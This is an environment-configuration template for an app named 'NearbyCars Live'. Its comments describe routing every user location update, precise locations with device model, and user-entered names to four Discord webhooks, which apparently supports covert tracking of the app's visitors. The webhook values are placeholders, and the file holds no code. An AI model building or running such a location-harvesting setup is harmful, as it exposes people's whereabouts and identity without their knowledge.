# ============================================
# NearbyCars Live - Environment Configuration
# ============================================
# Copy this file to .env and fill in your values

# Server Configuration
PORT=3000
NODE_ENV=production

# Discord Webhook URLs
# Webhook 1: Receives ALL location updates (continuous live tracking)
WEBHOOK_URL=https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN

# Webhook 2: Receives location updates when accuracy is HIGH (< 10 meters)
# Also includes device name/model when available
WEBHOOK_URL_2=https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN

# Webhook 3: Receives name + location data (after user enters their name)
WEBHOOK_URL_3=https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN

# Webhook 4: Receives name + HIGH accuracy location (< 10 meters)
WEBHOOK_URL_4=https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN

# MessageCentral OTP Credentials (Optional - for mobile verification)
# Sign up at https://messagecentral.io/
MC_AUTH_TOKEN=
MC_DEVICE_ID=

# Embed Colors (Decimal format for Discord)
# Default: Gold (15844367)
EMBED_COLOR=15844367
# High Accuracy: Green (3066993)
EMBED_COLOR_HIGH=3066993
# Name Log: Blue (3447003)
EMBED_COLOR_NAME=3447003
# OTP Verified: Purple (10181039)
EMBED_COLOR_OTP=10181039
